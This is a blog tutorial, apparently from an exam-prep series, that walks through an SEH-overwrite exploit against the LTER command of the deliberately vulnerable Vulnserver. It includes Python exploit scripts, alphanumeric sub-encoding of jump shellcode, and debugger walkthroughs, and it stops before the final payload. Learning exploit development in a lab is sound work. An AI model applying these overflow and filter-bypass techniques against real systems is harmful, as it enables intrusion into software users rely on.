---
layout: single
title: CTP/OSCE Prep -- A Noob's Approach to Alphanumeric Shellcode (LTER SEH Overwrite)
date: 2019-6-01
classes: wide
header:
  teaser: /assets/images/CTP/immunity.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
  - OSCE
  - CTP
  - SEH
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

In this particular post, we will be approaching an overflow in the `LTER` parameter trying to utilize all the tricks we've learned thus far. 

If you have not already done so, please read some of the posts in the 'CTP/OSCE Prep' series as this post will be **light** on review! 

## Goals

For this post, our goal is to walk through the right way to do the SEH overwrite exploit to `LTER` on Vulnserver and learn a new technique for encoding shellcode. 

## Doyler (@doylersec) Shoutout

Just want to take a second and shoutout @doylersec for all of his help with this particular exploit. You should probably read his [blog post](https://www.doyler.net/security-not-included/vulnserver-lter-seh) on this exploit before anything else. It was a very clever solution and he was extremely charitable explaining it to me. 

On a sidenote, he's also partially responsible for me getting a few certifications. The content on his blog led me down several challenging and rewarding paths and I don't think it's an exaggeration to say that I wouldn't be where I am today without his content. 

*The content you publish for others to learn is important and can have a huge impact!*

## Alphanumeric Shellcode

As we discovered in the [previous post](https://h0mbre.github.io/LTER_SEH_Exploit/), this particular command, `LTER`, is filtering for alphanumeric shellcode. To reiterate, that restricts us to the following characters: 
```terminal_session
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f
```

One way to overcome this limitation is to 'sub encode' your shellcode. As VelloSec explains in [CARVING SHELLCODE USING RESTRICTIVE CHARACTER SETS](http://vellosec.net/2018/08/carving-shellcode-using-restrictive-character-sets/), the manual process for sub encoding your payloads can be very tedious. I really recommend you read the VelloSec blog post. I probably had to read it through 6 times today. 

### Wrap Around Concept
One thing you need to know is, if you subtract your 4 byte payload from `0`, the value will wrap around. Let's use the Windows calculator to show this. To make things simple let's use a forbidden character of `\xf7` and show how we could get that somewhere on the stack without ever using it via sub encoding. 
1. First, we subtract `f7` from `0`. 

![](/assets/images/CTP/calc3.JPG)

2. We end up with `FFFF FFFF FFFF FF09`. We can ignore the proceeding `f` chars. 
3. Now that we have our value `09`, we need to manipulate it so that it ends up equaling `f7` without us ever using a forbidden character. 
4. Our next job is come up with 3 numbers that added together will equal our `09`. We'll use `04`, `03`, and `02`.
5. If we then use **three** `SUB` instructions, we can reach our original `f7` value. 
6. `0` - `4` = `FFFF FFFF FFFF FFFC‬`
7. `FFFF FFFF FFFF FFFC‬` - `3` = `FFFF FFFF FFFF FFF9‬`
8. `FFFF FFFF FFFF FFF9‬` - `2` = `FFFF FFFF FFFF FFF7`

As you can see, we ended up back at our `F7` without ever using it! That fundamental concept will be what we use throughout this exploit. 

### Automating Encoding 
At a high-level what we're going to accomplish with sub encoding and how we're going to use it in this exploit is: 
1. We're going to use `AND` operations to zero out the `EAX` register,
2. We're going to manipulate the `EAX` register with `SUB` and `ADD` instructions so that it eventually holds the value of our intended 4 byte payload,
3. We're going to push that value onto the stack so that `ESP` is pointing to it. 

As VelloSec put it lightly, manual encoding each 4 byte string can be tedious (especially if at some point you have to encode an entire reverse shell payload). Luckily, @ihack4falafel (Hashim Jawad) has created an amazing encoder called [Slink](https://github.com/ihack4falafel/Slink) for us to use. His encoder uses more `ADD` instructions but abuses the same wrap around concept. 

Let's show an example of how to use the tool with the test payload: `\xfe\xcf\xff\xe3`

![](/assets/images/CTP/test1.gif)

As you can see, the tool took almost no time at all to encode our payload. One thing to note, Slink only encodes 4 bytes at a time so if you submit a payload that's longer than 4 bytes make sure you grab **ALL** the output from Slink. A good thing to look out for is the `Shellcode final size:`.

### Using Encoded Payloads 
So now that we have our encoded payload, how do we get this to actually execute? As you can see, the final instruction in our encoded payload is always `\x50` or `push EAX`. This is going to place the value of `EAX` ontop of the stack and decrement `ESP` by 4 bytes. What does this mean? This means that wherever `ESP` is, when we go through our `SUB` instructions and push `EAX`, `ESP - 4` is going to be where our code is that we want to execute. To demonstrate, let's use some actual code we use in the exploit. 

Let's say we want to short-jump backwards (or negative) the maximum amount. The code to do this is `\xeb\x80`. Obviously we can't use `\xeb` or `\x80` as both of these bytes are not in our allowable range. Let's leverage Slink!

![](/assets/images/CTP/test2.gif)

Now we have our code:
```terminal_session
jump = ""
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
jump += "\x50"                 ## push eax 
```

Once we complete the `add  eax, 0x40404075` line, `EAX` will hold the value `909080EB`. This is dark magic.
Now when we `push eax`, `909080EB` will go into the 4 bytes "below" (really above visually, but below address wise as the stack grows in address size as it goes down) `ESP` and then `ESP` will be decremented by 4. 

So how can we use this? Well if we move our ESP to an advantageous spot before using our encoded shellcode, we could have execution finish our decoder, place our desired value onto the stack right below our decoder, and then control will pass to our desired value (shellcode). 

### Moving ESP Before Decoding
First, what is meant by 'decoding' in this context? Decoding happens when we push `EAX` onto the stack, this places our real code (the value held by `EAX`) right below `ESP`. 

So if our decoded shellcode is going to end up right below `ESP`, we need to know where that is and we need to move it to a location we want so that the program execution goes to it before going over other, potentially harmful instructions. 

To explain, here are some high-level diagrams. 

If we *DON'T* move `ESP`:

![](/assets/images/CTP/no1ESP.JPG)

As you can see in our fake program, there's a lot of space between where the code execution is and where our decoded payload is. We want our decoded payload closer to our execution so that execution can pass into our shellcode. The mechanism we are going to use to do this is very simple. Let's break out the Assembly and demonstrate it. Let's say our current `ESP` is `0178ffe9` and we need it to be at `0178ff6a`. What we're going to do is:
1. Find the difference between the two addresses (`0178ffe9` - `0178ff6a` = `7f`),
2. Push the value inside `ESP` (`0178ffe9`) onto the top of the stack,
3. Pop the value off of the top of the stack and into `EAX`,
4. Subtract `7f` from `EAX`,
5. Push `EAX` onto the stack,
6. and finally, pop the value off the top of the stack (our adjusted value of `0178ff6a`) into `ESP`. 

In Assembly:
```nasm
global_start

section .txt
_start:

push esp
pop eax
sub al, 0x7f
push eax
pop esp
```

After dumping the hex:
```terminal_session
astrid:~/ # objdump -D ./test


Disassembly of section .txt:

08049000 <_start>:
 8049000:	54                   	push   %esp
 8049001:	58                   	pop    %eax
 8049002:	2c 7f                	sub    $0x7f,%al
 8049004:	50                   	push   %eax
 8049005:	5c                   	pop    %esp
```

Now `ESP` holds our desired value and is where we want it. We can now safely decode our payload have the decoded payload end up closer to our execution. 

Let's walkthrough the simplest example from the exploit so that we can solidify this concept. Once we solidify the 'Move ESP --> Decode Payload --> Execute Decoded Payload' concept, we are ready for the exploit. 

### Walking Through Negative Jump

For this walkthrough, we'll be using the short negative jump we encoded earlier: `\xeb\x80\x90\x90`

The instances of `\x44` (`INC ESP` OR '`D`' values in ASCII) are on the stack because of our overflow.

### Step #1
Here is our starting point. As you can see, `ESP` is currently at `0196ECA4`. Once we execute the `PUSH EAX` instruction at `0196FFE8`, our decoded jump will be placed right below `ESP` and `0196ECA4` isn't even on our page or anywhere close to where our execution will be and we want to use it to jump before control is passed to something else.

![](/assets/images/CTP/Step1.JPG)

### Step #2
After executing the `PUSH ESP` we have the following register values. 

![](/assets/images/CTP/Step2.JPG)

### Step #3
After executing the `POP EAX` you can see that value of `ESP` is now stored in `EAX`. This address is lower (in value, above us graphically) than we are right now, so we have to add to it to get it to us. 

![](/assets/images/CTP/Step3.JPG)

### Step #4
After adding `0x134b` to our `EAX`, it's now pointing to `017EFFEF` which we can see as being about 8 bytes away from our last instruction (`PUSH EAX`). 

![](/assets/images/CTP/Step4.JPG)

### Step #5
We've now pushed `EAX` onto the stack.

![](/assets/images/CTP/Step5.JPG)

### Step #6
Now that we've executed `POP ESP`, `ESP` is pointing to the address `017EFFEF`!

![](/assets/images/CTP/Step6.JPG)

### Step #7
Next, we'll `AND EAX` twice to zero the register out. If you need help understanding this part, refer to the VelloSec post, which does a great job explaining it. As you can see `EAX` now has a value of `00000000`. 

![](/assets/images/CTP/Step7.JPG)

### Step #8
After these two `ADD` instructions, `EAX` is now holding our payload `909008EB`. 

![](/assets/images/CTP/Step8.JPG)

### Step #9
Finally, we execute `PUSH EAX` which will push our payload `909008EB` right ontop of `ESP` which is pointed at `017EFFEF`. Our red `JMP` command pops onto our stack and we are overjoyed that everything went as planned and that we will soon execute a jump backwards.

![](/assets/images/CTP/Step9.JPG)

### Summary

To kind of summarize our concerns during this process of: adjusting `ESP`, sending encoded shellcode, and finally decoding it, we need to keep a few things in mind. If we have a buffer space thats say 100 bytes, we can place our `ESP` adjustment **code** starting at byte `0`, our encoded shellcode will go right after our `ESP` adjustment, and finally our `ESP` should be adjusted to point at the **bottom** of our buffer space (near byte 100).

This is because as our encoded shellcode gets decoded, it is placed on top (visually) of `ESP` and so it is growing upwards into lower memory addresses. It is growing **towards** our encoded shellcode. 

![](/assets/images/CTP/decodeexplainer.JPG)

## Building the Exploit

If you have no experience with SEH overwrite exploits, definitely check out the [first one we did](https://h0mbre.github.io/SEH_Based_Exploit/) in the series before going any further as we won't really spend much time reviewing the basic SEH overwrite techniques. 

Again, this exploit methodology is largely the same as Doyler's as I leaned on his walkthrough heavily, but I still wanted to share it to highlight the techniques it teaches. 

### Overwriting SEH
We will pick up at the SEH overwrite which is where we left off in the last post. We know we're restricted to alphanumeric shellcode. Let's overflow the SEH components and then find our offsets with Mona. 

If we send our `A` value buffer we overwrite both 4 byte components of the SEH chain. 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

buffer = 'A' * 4000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

![](/assets/images/CTP/LTERsehoverwrite.JPG)

After using Mona to determine the offsets, we see that we overwrite SEH at 3514 bytes. So our new payload looks like this: 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

buffer = 'A' * 3514
buffer += 'B' * 4
buffer += 'C' * 4
buffer += 'D' * (4000 - 3514 - 4 - 4)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

And we can verify that we have overwritten SEH appropriately:

![](/assets/images/CTP/LTERsehoffset.JPG)

And our stack looks great!

![](/assets/images/CTP/LTERgoodstack.JPG)

Next we need to place a `POP POP RET` into our `C` buffer space. Let's let Mona do the dirty work with a `!mona seh -cp ascii` command. 

![](/assets/images/CTP/LTERseh.JPG)

Let's use one of the `essfunc.dll` gadgets and grab the one at address `6250172B`.

Next we need to place jump code into the 'next SEH record' space that will land us in our `D` value buffer. Let's use our trust 'Net Jump' technique since `EB` is restricted. We'll accomplish this by juxtaposing the opcodes \x74 (JZ) and \x75 (JNZ) and jump lengths of `0x06` and `0x04`. Since one of these is always true, we will end up in our `D` buffer. 

So now our exploit looks like this:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'
Seh = '\x2b\x17\x50\x62'

buffer = 'A' * 3514
buffer += nSeh
buffer += Seh
buffer += 'D' * (4000 - 3514 - 4 - 4)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

As you can see, this jumps us into our `D` buffer. **Don't forget to put a breakpoint at our `nSeh` jump code so you can step through from here going forward.**

We: 
1. land in our current SEH address which is a `POP POP RET`,
2. we use `POP POP RET` to jump up into our 'next SEH' byte-space which holds jump code, 
3. we jump into our `D` buffer. 

![](/assets/images/CTP/LTERdbuff.JPG)

EIP is pointed at the top of our `D` buffer, we're good to go. This `D` buffer isn't large enough for much code. We also don't have enough room to encode an egghunter. We don't even have enough room to set up an encoded long jump back (I tried, boy did I try.) Let's use our aforementioned negative jump back that we went over in the Alphanumeric section of the post.

### First Negative Jump Back
First thing we need to do is `push esp` and `pop eax` so that we can set up `ESP` to near the bottom of our `D` buffer so that our decoded code will appear right above it visually and we'll be able to pass execution to our jump back. 

Using `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` (thanks @AnubisOnSec!), we can get those opcodes easily. 
```terminal_session
astrid:~/ # /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > push esp
00000000  54                push esp
nasm > pop eax
00000000  58                pop eax
```

So our first code in our `D` buffer will be: `\x54\x58`

Next, we have to figure out the difference between `EAX` and where we want it. `EAX` is currently pointed at `0174ECA4` since we put the `ESP` value in there. We want it near the bottom of our `D` buffer so that it's near once our decoded shellcode appears on top of it. I picked the address `0174FFEF` and then calculated the difference. (`0174FFEF` - `0174ECA4` = `134B`). So we need to move up `134B` spaces. Let's get the opcodes in the nasm shell. 
```terminal_session
nasm > add ax, 0x134b
00000000  66054B13          add ax,0x134b
```

Ok so `EAX` will now hold the value `174FFEF`, now to just push that value back into `ESP`. 
```terminal_session
nasm > push eax
00000000  50                push eax
nasm > pop esp
00000000  5C                pop esp
```

So the rest of our code to prepare `ESP` is: `\x66\x05\x4b\x13\x50\x5C`.
Let's add the variable `espAdj` to our exploit which now looks like this: 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'
Seh = '\x2b\x17\x50\x62'
espAdj = '\x54\x58\x66\x05\x4b\x13\x50\x5C'

buffer = 'A' * 3514
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += 'D' * (4000 - 3514 - len(nSeh) - len(Seh) - len(espAdj))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

And let's run it and see how well we did. If all went well, when we step through this code in the `D` buffer, `ESP` should be pointing at our desired address for it `0174FFEF`. 

![](/assets/images/CTP/LTERespalign.JPG)

As you can see we were successful! 

### Encoding/Decoding a Short Jump Backwards

Now that we know where our decoded shellcode will appear (visually right above `ESP`), we are free to put our encoded jump backwards into our shellcode. After feeding the shellcode `\xeb\x80\x90\x90` to Slink, we get the following encoded payload: 
```terminal_session
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
jump += "\x50"
```

So let's add this to our payload, which now looks like this:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'
Seh = '\x2b\x17\x50\x62'
espAdj = '\x54\x58\x66\x05\x4b\x13\x50\x5C'
jump = ""
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
jump += "\x50" 


buffer = 'A' * 3514
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += jump
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

Let's send this and do a before and after for our Encoded/Decoded payload. If it is done correctly, a red `JMP` instruction should pop out of thin air visually on top of `ESP` once we execute the last part, the `\x50` (push `EAX`). 

**BEFORE**

![](/assets/images/CTP/LTERb4.JPG)

**AFTER**

![](/assets/images/CTP/LTERafter.JPG)

It totally worked and now we will let execution pass down to our new `JMP` operation and we will jump backwards and land in our `A` buffer!!

### Encoding a Second Jump Backwards






-- TO BE CONTINUED... --

## Resources
+ [OffSec Alphanumeric Shellcode](https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/)
+ [Corelan Mona Tutorial](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
